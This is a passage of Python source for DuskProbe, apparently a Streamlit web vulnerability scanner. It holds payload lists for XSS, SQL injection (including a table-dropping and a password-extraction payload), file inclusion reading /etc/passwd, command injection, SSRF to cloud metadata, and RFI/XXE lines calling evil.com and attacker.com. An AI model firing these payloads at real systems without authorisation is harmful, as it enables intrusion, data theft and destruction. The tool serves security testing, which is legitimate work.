#!/usr/bin/env python3
"""
DuskProbe v5.0 - Advanced Asynchronous Web Vulnerability Scanner
Streamlit Web Application Version
Author: Labib Bin Shahed

Usage:
    streamlit run streamlit_duskprobe.py
"""

import os
import re
import json
import socket
import logging
import sys
import asyncio
import aiohttp
import time
from logging.handlers import RotatingFileHandler
from pathlib import Path
from datetime import datetime
from typing import List, Dict, Set, Tuple
from urllib.parse import urlparse, urljoin, quote

# Streamlit imports
import streamlit as st

# Rich console for beautiful output (adapted for Streamlit)
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
import yaml

# Check for optional dependencies and set flags
try:
    import pandas as pd
    PD_AVAILABLE = True
except ImportError:
    PD_AVAILABLE = False

try:
    import plotly.express as px
    import plotly.graph_objects as go
    PLOTLY_AVAILABLE = True
except ImportError:
    PLOTLY_AVAILABLE = False

try:
    from bs4 import BeautifulSoup
    BS4_AVAILABLE = True
except ImportError:
    BS4_AVAILABLE = False

try:
    from stem import Signal
    from stem.control import Controller
    TOR_AVAILABLE = True
except ImportError:
    TOR_AVAILABLE = False

try:
    from fake_useragent import UserAgent
    UA_AVAILABLE = True
except ImportError:
    UA_AVAILABLE = False

# Enhanced reconnaissance and vulnerability scanning libraries
try:
    import shodan
    SHODAN_AVAILABLE = True
except ImportError:
    SHODAN_AVAILABLE = False

try:
    import whois
    WHOIS_AVAILABLE = True
except ImportError:
    WHOIS_AVAILABLE = False

try:
    import builtwith
    BUILTWITH_AVAILABLE = True
except ImportError:
    BUILTWITH_AVAILABLE = False

try:
    import waybackpy
    WAYBACK_AVAILABLE = True
except ImportError:
    WAYBACK_AVAILABLE = False

try:
    import dns.resolver
    import dns.query
    import dns.zone
    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False

try:
    import scapy.all as scapy
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

try:
    import sslyze
    from sslyze import Scanner, ServerScanRequest, ServerNetworkLocation
    from sslyze.plugins.scan_commands import ScanCommand
    SSLYZE_AVAILABLE = True
except ImportError:
    SSLYZE_AVAILABLE = False

try:
    import httpx
    HTTPX_AVAILABLE = True
except ImportError:
    HTTPX_AVAILABLE = False

try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

# Advanced Security Libraries for Enhanced Reconnaissance
try:
    import paramiko
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False

try:
    import nmap
    NMAP_AVAILABLE = True
except ImportError:
    NMAP_AVAILABLE = False

try:
    from Crypto.Cipher import AES
    from Crypto.Hash import MD5, SHA256
    PYCRYPTO_AVAILABLE = True
except ImportError:
    PYCRYPTO_AVAILABLE = False

try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.common.by import By
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False

try:
    import lxml
    from lxml import html, etree
    LXML_AVAILABLE = True
except ImportError:
    LXML_AVAILABLE = False

try:
    import censys.search
    CENSYS_AVAILABLE = True
except ImportError:
    CENSYS_AVAILABLE = False

try:
    import vulners
    VULNERS_AVAILABLE = True
except ImportError:
    VULNERS_AVAILABLE = False

try:
    import sublist3r
    SUBLIST3R_AVAILABLE = True
except ImportError:
    SUBLIST3R_AVAILABLE = False

try:
    import dirb
    DIRB_AVAILABLE = True
except ImportError:
    DIRB_AVAILABLE = False

try:
    import subprocess
    import concurrent.futures
    ADVANCED_TOOLS_AVAILABLE = True
except ImportError:
    ADVANCED_TOOLS_AVAILABLE = False

try:
    import magic
    FILEMAGIC_AVAILABLE = True
except ImportError:
    FILEMAGIC_AVAILABLE = False

try:
    import jwt
    import base64
    JWT_AVAILABLE = True
except ImportError:
    JWT_AVAILABLE = False

try:
    import requests_html
    REQUESTS_HTML_AVAILABLE = True
except ImportError:
    REQUESTS_HTML_AVAILABLE = False

try:
    import urllib.robotparser
    import urllib.parse as urlparse_advanced
    ROBOTPARSER_AVAILABLE = True
except ImportError:
    ROBOTPARSER_AVAILABLE = False

try:
    from collections import deque
    import threading
    import time
    THREADING_AVAILABLE = True
except ImportError:
    THREADING_AVAILABLE = False

try:
    import hashlib
    import mimetypes
    CONTENT_ANALYSIS_AVAILABLE = True
except ImportError:
    CONTENT_ANALYSIS_AVAILABLE = False

# Constants
DEFAULT_USER_AGENT = "DuskProbe/5.0"
LOG_FORMAT = '%(asctime)s - %(levelname)s - %(message)s'
REQUEST_TIMEOUT = 3
CONCURRENCY_LIMIT = 100
CONFIG_FILE = 'config.yaml'

# Initialize session state
if 'scan_results' not in st.session_state:
    st.session_state.scan_results = None
if 'scan_in_progress' not in st.session_state:
    st.session_state.scan_in_progress = False
if 'current_scan_status' not in st.session_state:
    st.session_state.current_scan_status = ""

# Rich console for beautiful output
console = Console()

# --- Configuration Class for Streamlit ---

class StreamlitConfig:
    """Configuration management for DuskProbe Streamlit app."""
    
    def __init__(self, scan_config):
        self.scan_config = scan_config
        self.console = console
        
        # Set up directories
        self.reports_dir = Path.cwd() / "reports"
        self.logs_dir = Path.cwd() / "logs"
        
        # Create directories
        self.reports_dir.mkdir(parents=True, exist_ok=True)
        self.logs_dir.mkdir(parents=True, exist_ok=True)
        
        # Setup logging
        self.logger = self._setup_logging()
        
        # Create args-like object for compatibility
        self.args = type('obj', (object,), {
            'config': None,
            'output_dir': str(self.reports_dir),
            'log_dir': str(self.logs_dir),
            'verbose': scan_config.get('verbose', False),
            'quiet': False,
            'tor': scan_config.get('tor', False),
            'crawl': scan_config.get('crawl', False),
            'format': scan_config.get('format', 'json')
        })()
    
    def _setup_logging(self):
        """Setup comprehensive logging."""
        logger = logging.getLogger("DuskProbe")
        
        # Set log level
        log_level = logging.INFO
        if self.scan_config.get('verbose', False):
            log_level = logging.DEBUG
        logger.setLevel(log_level)
        
        # Remove existing handlers
        if logger.hasHandlers():
            logger.handlers.clear()
        
        # File handler
        log_file = self.logs_dir / f"duskprobe_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
        file_handler = RotatingFileHandler(log_file, maxBytes=5*1024*1024, backupCount=3)
        file_handler.setLevel(logging.DEBUG)
        file_formatter = logging.Formatter(LOG_FORMAT)
        file_handler.setFormatter(file_formatter)
        logger.addHandler(file_handler)
        
        self.log_file = log_file
        return logger


# --- Asynchronous Networking ---

class AsyncSession:
    """Optimized asynchronous session handler with aggressive performance settings."""

    def __init__(self, config):
        self.config = config
        # Dramatically increased concurrency for maximum speed
        self.semaphore = asyncio.Semaphore(100)  # Increased from 10 to 100
        self.response_cache = {}  # Cache to avoid duplicate requests
        
        headers = {
            'User-Agent': UserAgent().random if UA_AVAILABLE else DEFAULT_USER_AGENT,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'Accept-Encoding': 'gzip, deflate'  # Enable compression for speed
        }
        
        # Optimized connector settings for maximum performance
        connector = aiohttp.TCPConnector(
            limit=200,              # Increased connection pool
            limit_per_host=50,      # More connections per host
            ttl_dns_cache=300,      # DNS caching
            use_dns_cache=True,
            enable_cleanup_closed=True,
            keepalive_timeout=30,
            ssl=False               # Disable SSL verification for speed in testing
        )
        
        self.session = aiohttp.ClientSession(
            headers=headers,
            timeout=aiohttp.ClientTimeout(
                total=3,            # Reduced from 10 to 3 seconds
                connect=1,          # Fast connection timeout
                sock_read=2         # Socket read timeout
            ),
            connector=connector
        )

    async def __aenter__(self):
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        await self.close()

    async def get(self, url: str, allow_redirects=True) -> Tuple[int, Dict, str, str]:
        """Optimized GET request with caching and early returns."""
        # Check cache first to avoid duplicate requests
        cache_key = f"GET:{url}"
        if cache_key in self.response_cache:
            return self.response_cache[cache_key]
            
        async with self.semaphore:
            try:
                async with self.session.get(url, allow_redirects=allow_redirects) as response:
                    # Fast content reading with size limit for performance
                    content = await response.text(errors='ignore')
                    if len(content) > 100000:  # Limit content size for speed
                        content = content[:100000]
                    
                    result = (response.status, dict(response.headers), content, str(response.url))
                    
                    # Cache successful responses to avoid duplicate requests
                    if response.status == 200 and len(self.response_cache) < 1000:
                        self.response_cache[cache_key] = result
                    
                    return result
                    
            except aiohttp.ClientError as e:
                self.config.logger.debug(f"Request error for {url}: {e}")
            except asyncio.TimeoutError:
                self.config.logger.debug(f"Request timed out for {url}")
            return None, {}, "", url

    async def post(self, url: str, data=None, headers=None, **kwargs) -> Tuple[int, Dict, str, str]:
        """Optimized POST request for vulnerability testing."""
        async with self.semaphore:
            try:
                post_headers = headers or {}
                async with self.session.post(url, data=data, headers=post_headers, 
                                           allow_redirects=True, **kwargs) as response:
                    content = await response.text(errors='ignore')
                    if len(content) > 100000:  # Limit content for speed
                        content = content[:100000]
                    return (response.status, dict(response.headers), content, str(response.url))
                    
            except aiohttp.ClientError as e:
                self.config.logger.debug(f"POST request error for {url}: {e}")
            except asyncio.TimeoutError:
                self.config.logger.debug(f"POST request timed out for {url}")
            return None, {}, "", url

    async def close(self):
        if not self.session.closed:
            await self.session.close()


# --- Security Checks ---

class SecurityChecker:
    """Advanced security checks with enterprise-grade vulnerability detection."""
    
    def __init__(self, session: AsyncSession, config):
        self.session = session
        self.config = config
        
        # Advanced payload sets for comprehensive testing - FULL VERSION
        self.payloads = {
            'xss': [
                "<script>alert('XSS')</script>",
                "\"><script>alert('XSS')</script>",
                "javascript:alert('XSS')",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "';alert('XSS');//",
                "<iframe src=\"javascript:alert('XSS')\">",
                "<body onload=alert('XSS')>",
                "<details open ontoggle=alert('XSS')>",
                "<marquee onstart=alert('XSS')>",
                "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
                "<script>alert(/XSS/.source)</script>",
                "<img src=\"\" onerror=\"alert('XSS')\">",
                "<%2Fscript%3E%3Cscript%3Ealert('XSS')%3C%2Fscript%3E"
            ],
            'sqli': [
                "' OR 1=1--",
                "1' UNION SELECT null,null--",
                "admin'--",
                "' OR 'a'='a",
                "1' AND 1=1--",
                "1' OR 1=1#",
                "'; DROP TABLE users--",
                "1' UNION SELECT user(),version()--",
                "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                "1' OR SLEEP(5)--",
                "1' AND 1=2 UNION SELECT 1,2,3--",
                "1'; WAITFOR DELAY '00:00:05'--",
                "1' UNION ALL SELECT NULL,concat(user(),0x3a,version()),NULL--",
                "1'||'1'='1",
                "1' AND ascii(substring((SELECT password FROM users LIMIT 1),1,1))>64--"
            ],
            'lfi': [
                "../../../../etc/passwd",
                "....//....//....//etc/passwd",
                "/etc/passwd%00",
                "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
                "....//....//....//....//etc//passwd",
                "php://filter/read=convert.base64-encode/resource=index.php",
                "php://input",
                "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
                "expect://whoami",
                "/proc/self/environ",
                "/proc/version",
                "/etc/hostname",
                "C:\\windows\\system32\\drivers\\etc\\hosts",
                "/var/log/apache2/access.log",
                "....//....//....//....//windows//system32//drivers//etc//hosts"
            ],
            'rfi': [
                "http://evil.com/shell.txt",
                "https://pastebin.com/raw/malicious",
                "ftp://attacker.com/shell.php",
                "//evil.com/shell.txt"
            ],
            'cmd_injection': [
                "| id",
                "; id",
                "&& id",
                "|| id",
                "` id `",
                "$(id)",
                "|whoami",
                ";cat /etc/passwd",
                "&&ls -la",
                "|ping -c 4 127.0.0.1",
                ";ping -n 4 127.0.0.1",
                "$(cat /etc/passwd)",
                "`cat /etc/passwd`",
                "| type C:\\windows\\system32\\drivers\\etc\\hosts"
            ],
            'ssrf': [
                "http://127.0.0.1:8080/",
                "http://localhost:22",
                "http://169.254.169.254/latest/meta-data/",
                "file:///etc/passwd",
                "http://[::1]:80/",
                "http://0.0.0.0:8080",
                "gopher://127.0.0.1:6379/",
                "dict://localhost:11211/",
                "http://metadata.google.internal/computeMetadata/v1/",
                "http://169.254.169.254/metadata/v1/",
                "ldap://127.0.0.1:389/"
            ],
            'xxe': [
                "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
                "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\"> %xxe;]>",
                "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file:///c:/windows/system32/drivers/etc/hosts\">]><data>&file;</data>"
            ],
            'template_injection': [
                "{{7*7}}",
                "${7*7}",
                "<%=7*7%>",
                "{{config}}",
                "{{config.items()}}",
                "${T(java.lang.Runtime).getRuntime().exec('id')}",
                "#{7*7}",
                "${{7*7}}",
                "{{''.__class__.__mro__[2].__subclasses__()}}"
            ],
            'nosql_injection': [
                "[$ne]=null",
                "[$regex]=.*",
                "[$gt]=",
                "[$where]=sleep(1000)",
                "'; return true; var dummy='",
                "' || 1==1//",
                "[$exists]=false"
            ],
            'ldap_injection': [
                "*",
                "*)(&",
                "*))%00",
                "admin)(&(objectClass=*",
                "*)|(objectClass=*"
            ],
            'xpath_injection': [
                "' or '1'='1",
                "' or 1=1 or ''='",
                "x' or name()='username' or 'x'='y",
                "'] | //user/*[contains(*,'admin')] | //comment()['"
            ],
            'sensitive_files': [
                ".git/config",
                ".env",
                ".htaccess",
                "web.config",
                "WEB-INF/web.xml",
                "META-INF/MANIFEST.MF",
                "config.php",
                "database.yml",
                "settings.py",
                ".aws/credentials",
                "id_rsa",
                "id_dsa",
                "known_hosts",
                "backup.sql",
                "dump.sql",
                "phpinfo.php",
                "test.php",
                "robots.txt",
                "sitemap.xml",
                ".DS_Store",
                "Thumbs.db",
                "desktop.ini",
                "crossdomain.xml",
                "clientaccesspolicy.xml",
                "swagger.json",
                "swagger.yaml",
                "api-docs"
            ],
            'open_redirect': [
                "//evil.com",
                "https://evil.com",
                "javascript:alert('XSS')",
                "/\\evil.com",
                "//google.com@evil.com",
                "https://google.com.evil.com",
                "\\\\evil.com"
            ],
            'crlf_injection': [
                "%0d%0aSet-Cookie:%20malicious=true",
                "%0d%0aContent-Length:%200%0d%0a%0d%0a",
                "\r\nSet-Cookie: injected=true",
                "%0d%0aLocation:%20http://evil.com"
            ]
        }
        
        # Enhanced pattern matching
        self.error_patterns = {
            'sql': re.compile(r'(sql|mysql|oracle|postgresql|mssql|sqlite|syntax error|unclosed quotation|quoted string|unexpected end|column .* doesn\'t exist)', re.I),
            'php': re.compile(r'(php warning|php error|fatal error|parse error|undefined function|call to undefined)', re.I),
            'asp': re.compile(r'(microsoft ole db|odbc|jet database|asp\.net)', re.I),
            'java': re.compile(r'(java\.lang\.|java\.sql\.|javax\.|spring framework|struts)', re.I),
            'python': re.compile(r'(traceback|python|django|flask)', re.I),
            'generic': re.compile(r'(error|exception|warning|stack trace|debug)', re.I)
        }
        
        self.file_indicators = re.compile(r'(root:|daemon:|bin/bash|java.sun.com|windows|system32|users:|administrators:)', re.I)
        self.aws_metadata = re.compile(r'(ami-id|instance-id|security-groups|iam)', re.I)
        self.gcp_metadata = re.compile(r'(compute|instance|metadata)', re.I)

    async def full_check(self, url: str, progress_callback=None) -> Dict:
        """Enhanced security checks with advanced reconnaissance and vulnerability scanning."""
        all_findings = []
        
        # Update progress
        if progress_callback:
            progress_callback("Starting comprehensive reconnaissance...", 5)
        
        # Get comprehensive site information
        site_info = await self.get_site_info(url)
        
        # Phase 1: Advanced Reconnaissance (10% progress)
        if progress_callback:
            progress_callback("Performing advanced reconnaissance...", 10)
        
        reconnaissance_findings = await self._comprehensive_vulnerability_scan(url)
        all_findings.extend(reconnaissance_findings)
        
        # Smart payload prioritization - test high-impact vulnerabilities first
        priority_tasks = []
        
        # Priority 1: Critical vulnerabilities with most effective payloads
        high_priority = ['sqli', 'lfi', 'cmd_injection', 'sensitive_files']
        for check_type in high_priority:
            if check_type in self.payloads:
                # Use top 3 most effective payloads for speed
                effective_payloads = self.payloads[check_type][:3]
                for payload in effective_payloads:
                    priority_tasks.append(self.check_vulnerability(url, check_type, payload))
        
        # Priority 2: Medium impact vulnerabilities  
        medium_priority = ['xss', 'ssrf', 'open_redirect']
        for check_type in medium_priority:
            if check_type in self.payloads:
                effective_payloads = self.payloads[check_type][:2]  # Top 2 payloads
                for payload in effective_payloads:
                    priority_tasks.append(self.check_vulnerability(url, check_type, payload))
        
        # Priority 3: Specialized injection types (1 payload each for speed)
        specialized = ['nosql_injection', 'ldap_injection', 'xpath_injection', 'crlf_injection', 'template_injection', 'xxe']
        for check_type in specialized:
            if check_type in self.payloads:
                # Only use the most effective payload
                priority_tasks.append(self.check_vulnerability(url, check_type, self.payloads[check_type][0]))
        
        # Add header check
        priority_tasks.append(self.check_headers(url))

        # Execute with batch processing (90% progress)
        if progress_callback:
            progress_callback("Running comprehensive vulnerability tests...", 30)
        
        batch_size = 10  # Process in batches
        total_tasks = len(priority_tasks)
        
        for i in range(0, total_tasks, batch_size):
            batch = priority_tasks[i:i + batch_size]
            results = await asyncio.gather(*batch, return_exceptions=True)
            
            for result in results:
                if isinstance(result, list):
                    all_findings.extend(result)
                elif isinstance(result, Exception):
                    self.config.logger.debug(f"Task failed: {result}")
            
            # Update progress
            if progress_callback:
                progress_percent = 30 + int((i + batch_size) / total_tasks * 60)
                progress_callback(f"Completed {min(i + batch_size, total_tasks)}/{total_tasks} vulnerability tests...", progress_percent)

        # Phase 3: Comprehensive Discovery Analysis
        if progress_callback:
            progress_callback("Performing comprehensive discovery analysis...", 90)
        
        # Enhanced scan results with advanced intelligence
        enhanced_site_info = site_info.copy()
        
        # Advanced webpage discovery
        webpage_discovery = await self._advanced_webpage_discovery(url)
        enhanced_site_info['webpage_discovery'] = webpage_discovery
        
        # File leak detection
        file_leak_analysis = await self._advanced_file_leak_detection(url)
        enhanced_site_info['file_leak_analysis'] = file_leak_analysis
        
        # Parameter enumeration
        parameter_enumeration = await self._advanced_parameter_enumeration(url)
        enhanced_site_info['parameter_enumeration'] = parameter_enumeration
        
        # Create comprehensive results
        results = {
            'url': url,
            'findings': all_findings,
            'site_info': enhanced_site_info,
            'scan_summary': {
                'total_tests': total_tasks + len(reconnaissance_findings),
                'vulnerabilities_found': len(all_findings),
                'critical_findings': len([f for f in all_findings if f.get('severity') == 'CRITICAL']),
                'high_findings': len([f for f in all_findings if f.get('severity') == 'HIGH']),
                'medium_findings': len([f for f in all_findings if f.get('severity') == 'MEDIUM']),
                'low_findings': len([f for f in all_findings if f.get('severity') == 'LOW'])
            },
            'advanced_reconnaissance': True,
            'comprehensive_discovery': True,
            'discovery_metrics': {
                'total_pages': webpage_discovery.get('total_pages', 0),
                'total_file_leaks': file_leak_analysis.get('total_leaks', 0),
                'total_parameters': parameter_enumeration.get('total_parameters', 0),
                'admin_panels': len(webpage_discovery.get('admin_panels', [])),
                'api_endpoints': len(webpage_discovery.get('api_endpoints', [])),
                'sensitive_files': len(file_leak_analysis.get('sensitive_files', [])),
                'injectable_parameters': len(parameter_enumeration.get('injectable_parameters', []))
            }
        }
        
        if progress_callback:
            progress_callback("Scan completed successfully!", 100)
        
        return results

    async def _comprehensive_vulnerability_scan(self, url: str) -> List[Dict]:
        """Comprehensive vulnerability scanning with advanced techniques."""
        findings = []
        
        try:
            # 1. Advanced Header Analysis
            header_findings = await self._advanced_security_header_analysis(url)
            findings.extend(header_findings)
            
            # 2. SSL/TLS Security Assessment
            if url.startswith('https://'):
                ssl_findings = await self._advanced_ssl_security_assessment(url)
                findings.extend(ssl_findings)
            
            # 3. Cookie Security Analysis
            cookie_findings = await self._advanced_cookie_security_analysis(url)
            findings.extend(cookie_findings)
            
            # 4. Information Disclosure Assessment
            info_disclosure_findings = await self._information_disclosure_assessment(url)
            findings.extend(info_disclosure_findings)
            
            # 5. Advanced Directory Traversal
            directory_findings = await self._advanced_directory_traversal_scan(url)
            findings.extend(directory_findings)
            
        except Exception as e:
            self.config.logger.debug(f"Comprehensive scan error: {e}")
        
        return findings

    async def _advanced_security_header_analysis(self, url: str) -> List[Dict]:
        """Advanced security header analysis."""
        findings = []
        
        try:
            result = await self.session.get(url)
            if result[0] is None:
                return findings
                
            status, headers, content, final_url = result
            headers_lower = {k.lower(): v for k, v in headers.items()}
            
            # Critical security headers
            critical_headers = {
                'strict-transport-security': 'CRITICAL',
                'content-security-policy': 'HIGH',
                'x-frame-options': 'MEDIUM',
                'x-content-type-options': 'LOW',
                'x-xss-protection': 'LOW',
                'referrer-policy': 'LOW'
            }
            
            for header, severity in critical_headers.items():
                if header not in headers_lower:
                    findings.append(self._create_finding(
                        'Missing Security Header',
                        severity,
                        f"Missing critical security header: {header}",
                        url
                    ))
            
            # Check for information disclosure headers
            disclosure_headers = ['server', 'x-powered-by', 'x-aspnet-version']
            for header in disclosure_headers:
                if header in headers_lower:
                    findings.append(self._create_finding(
                        'Information Disclosure',
                        'LOW',
                        f"Server information disclosed via {header} header: {headers_lower[header]}",
                        url
                    ))
                        
        except Exception as e:
            self.config.logger.debug(f"Security header analysis error: {e}")
        
        return findings

    async def _advanced_ssl_security_assessment(self, url: str) -> List[Dict]:
        """Advanced SSL/TLS security assessment."""
        findings = []
        
        try:
            result = await self.session.get(url)
            if result[0] is None:
                return findings
                
            status, headers, content, final_url = result
            headers_lower = {k.lower(): v for k, v in headers.items()}
            
            # HSTS analysis
            if 'strict-transport-security' not in headers_lower:
                findings.append(self._create_finding(
                    'Missing HSTS',
                    'HIGH',
                    'HTTP Strict Transport Security (HSTS) header is missing',
                    url
                ))
            else:
                hsts_value = headers_lower['strict-transport-security']
                if 'max-age=0' in hsts_value or 'max-age' not in hsts_value:
                    findings.append(self._create_finding(
                        'Weak HSTS Configuration',
                        'MEDIUM',
                        f'HSTS header has weak configuration: {hsts_value}',
                        url
                    ))
            
            # Mixed content check
            if content and 'http://' in content:
                findings.append(self._create_finding(
                    'Mixed Content',
                    'MEDIUM',
                    'HTTP resources loaded on HTTPS page (mixed content)',
                    url
                ))
                
        except Exception as e:
            self.config.logger.debug(f"SSL security assessment error: {e}")
        
        return findings

    async def _advanced_cookie_security_analysis(self, url: str) -> List[Dict]:
        """Advanced cookie security analysis."""
        findings = []
        
        try:
            result = await self.session.get(url)
            if result[0] is None:
                return findings
                
            status, headers, content, final_url = result
            
            set_cookie_headers = [v for k, v in headers.items() if k.lower() == 'set-cookie']
            
            for cookie_header in set_cookie_headers:
                cookie_lower = cookie_header.lower()
                
                # Check for missing Secure flag on HTTPS
                if url.startswith('https://') and 'secure' not in cookie_lower:
                    findings.append(self._create_finding(
                        'Insecure Cookie',
                        'MEDIUM',
                        f'Cookie missing Secure flag: {cookie_header}',
                        url
                    ))
                
                # Check for missing HttpOnly flag
                if 'httponly' not in cookie_lower:
                    findings.append(self._create_finding(
                        'Cookie Missing HttpOnly',
                        'LOW',
                        f'Cookie missing HttpOnly flag: {cookie_header}',
                        url
                    ))
                
                # Check for missing SameSite attribute
                if 'samesite' not in cookie_lower:
                    findings.append(self._create_finding(
                        'Cookie Missing SameSite',
                        'LOW',
                        f'Cookie missing SameSite attribute: {cookie_header}',
                        url
                    ))
                        
        except Exception as e:
            self.config.logger.debug(f"Cookie security analysis error: {e}")
        
        return findings

    async def _information_disclosure_assessment(self, url: str) -> List[Dict]:
        """Information disclosure assessment."""
        findings = []
        
        try:
            result = await self.session.get(url)
            if result[0] is None:
                return findings
                
            status, headers, content, final_url = result
            
            if not content:
                return findings
            
            content_lower = content.lower()
            
            # Check for debug information
            debug_indicators = [
                'debug', 'traceback', 'stack trace', 'error', 'exception',
                'warning', 'notice', 'mysql_connect', 'database error'
            ]
            
            for indicator in debug_indicators:
                if indicator in content_lower:
                    findings.append(self._create_finding(
                        'Information Disclosure',
                        'MEDIUM',
                        f'Debug/error information disclosed: {indicator}',
                        url
                    ))
                    break  # Only report once per page
            
            # Check for version information
            version_patterns = [
                r'version\s*[:\-]\s*[\d\.]+',
                r'v[\d\.]+',
                r'release\s*[:\-]\s*[\d\.]+',
                r'build\s*[:\-]\s*[\d\.]+'
            ]
            
            for pattern in version_patterns:
                matches = re.findall(pattern, content, re.IGNORECASE)
                if matches:
                    findings.append(self._create_finding(
                        'Version Information Disclosure',
                        'LOW',
                        f'Version information disclosed: {", ".join(matches[:3])}',  # Limit to first 3
                        url
                    ))
                    break
            
            # Check for email addresses
            email_pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
            emails = re.findall(email_pattern, content)
            if emails:
                findings.append(self._create_finding(
                    'Email Disclosure',
                    'LOW',
                    f'Email addresses disclosed: {", ".join(set(emails)[:5])}',  # Limit to first 5
                    url
                ))
                        
        except Exception as e:
            self.config.logger.debug(f"Information disclosure assessment error: {e}")
        
        return findings

    async def _advanced_directory_traversal_scan(self, url: str) -> List[Dict]:
        """Advanced directory traversal scanning."""
        findings = []
        
        # Common sensitive directories
        sensitive_dirs = [
            '/admin', '/administrator', '/wp-admin', '/phpmyadmin',
            '/backup', '/backups', '/config', '/configuration',
            '/test', '/testing', '/dev', '/development',
            '/staging', '/tmp', '/temp', '/.git', '/.svn',
            '/api', '/v1', '/v2', '/docs', '/documentation'
        ]
        
        try:
            for directory in sensitive_dirs:
                test_url = url.rstrip('/') + directory
                result = await self.session.get(test_url)
                
                if result[0] and result[0] not in [404, 403]:
                    severity = 'HIGH' if directory in ['/admin', '/.git', '/config'] else 'MEDIUM'
                    findings.append(self._create_finding(
                        'Exposed Directory',
                        severity,
                        f'Sensitive directory accessible: {directory}',
                        test_url
                    ))
                        
        except Exception as e:
            self.config.logger.debug(f"Directory traversal scan error: {e}")
        
        return findings

    async def _advanced_webpage_discovery(self, url: str) -> Dict:
        """Advanced webpage discovery."""
        discovery = {
            'total_pages': 0,
            'admin_panels': [],
            'api_endpoints': [],
            'backup_files': []
        }
        
        try:
            # Check robots.txt
            robots_url = urljoin(url, '/robots.txt')
            result = await self.session.get(robots_url)
            if result[0] == 200 and result[2]:
                discovery['robots_txt_found'] = True
                # Parse disallowed paths
                for line in result[2].split('\n'):
                    if line.strip().startswith('Disallow:'):
                        path = line.split(':', 1)[1].strip()
                        if path and path != '/':
                            discovery['total_pages'] += 1
                            if any(admin in path.lower() for admin in ['admin', 'management', 'control']):
                                discovery['admin_panels'].append(path)
                            elif 'api' in path.lower():
                                discovery['api_endpoints'].append(path)
            
            # Check sitemap.xml  
            sitemap_url = urljoin(url, '/sitemap.xml')
            result = await self.session.get(sitemap_url)
            if result[0] == 200 and result[2]:
                discovery['sitemap_found'] = True
                discovery['total_pages'] += len(re.findall(r'<loc>', result[2]))
                        
        except Exception as e:
            self.config.logger.debug(f"Webpage discovery error: {e}")
        
        return discovery

    async def _advanced_file_leak_detection(self, url: str) -> Dict:
        """Advanced file leak detection."""
        file_leaks = {
            'total_leaks': 0,
            'sensitive_files': []
        }
        
        # Check for common sensitive files
        sensitive_files = [
            '.env', '.env.local', '.env.production',
            'config.json', 'package.json', 'composer.json',
            '.git/config', '.gitignore', 'web.config',
            'database.yml', 'config.php', 'settings.py'
        ]
        
        try:
            for file_path in sensitive_files:
                test_url = urljoin(url, file_path)
                result = await self.session.get(test_url)
                
                if result[0] == 200 and result[2] and len(result[2]) > 50:
                    file_leaks['total_leaks'] += 1
                    file_leaks['sensitive_files'].append({
                        'file': file_path,
                        'size': len(result[2]),
                        'url': test_url
                    })
                        
        except Exception as e:
            self.config.logger.debug(f"File leak detection error: {e}")
        
        return file_leaks

    async def _advanced_parameter_enumeration(self, url: str) -> Dict:
        """Advanced parameter enumeration."""
        params = {
            'total_parameters': 0,
            'injectable_parameters': []
        }
        
        # Common parameter names to test
        common_params = [
            'id', 'user', 'page', 'file', 'path', 'url', 'redirect',
            'search', 'query', 'q', 'name', 'category', 'action'
        ]
        
        try:
            for param in common_params:
                test_url = f"{url}{'&' if '?' in url else '?'}{param}=test"
                result = await self.session.get(test_url)
                
                if result[0] and result[0] != 404:
                    params['total_parameters'] += 1
                    # Simple test for potential injection
                    if result[2] and 'test' in result[2]:
                        params['injectable_parameters'].append(param)
                        
        except Exception as e:
            self.config.logger.debug(f"Parameter enumeration error: {e}")
        
        return params

    async def get_site_info(self, url: str) -> Dict:
        """Get comprehensive site information."""
        info = {'url': url}
        
        try:
            result = await self.session.get(url)
            if result[0] is None:
                return info
                
            status, headers, content, final_url = result
            
            # Basic site information
            info.update({
                'status_code': status,
                'server': headers.get('server', 'Unknown'),
                'content_type': headers.get('content-type', 'Unknown'),
                'content_length': len(content) if content else 0,
                'final_url': final_url,
                'powered_by': headers.get('x-powered-by', 'Unknown'),
                'response_headers': dict(headers)
            })
            
            # Advanced analysis
            if content:
                # Technology detection
                info['technologies'] = self._detect_technologies(content, headers)
                
                # CMS detection
                info['cms'] = self._detect_cms_simple(content, headers)
                
                # JavaScript frameworks
                info['js_frameworks'] = self._detect_js_frameworks_simple(content)
                
                # Forms analysis
                info['forms_count'] = content.count('<form')
                info['input_fields'] = content.count('<input')
            
        except Exception as e:
            self.config.logger.debug(f"Error gathering site info: {e}")
        
        return info

    async def check_vulnerability(self, url: str, check_type: str, payload: str) -> List[Dict]:
        """Enhanced vulnerability check with comprehensive detection."""
        findings = []
        
        try:
            # Determine test URL based on vulnerability type
            if check_type == 'sensitive_files':
                test_url = urljoin(url, payload)
            elif check_type in ['xxe', 'template_injection']:
                return await self._check_post_vulnerability(url, check_type, payload)
            else:
                test_url = f"{url}{'&' if '?' in url else '?'}param={quote(payload)}"
            
            result = await self.session.get(test_url)
            if result[0] is None:
                return []
                
            status, headers, content, final_url = result
            if not content:
                return []

            content_lower = content.lower()
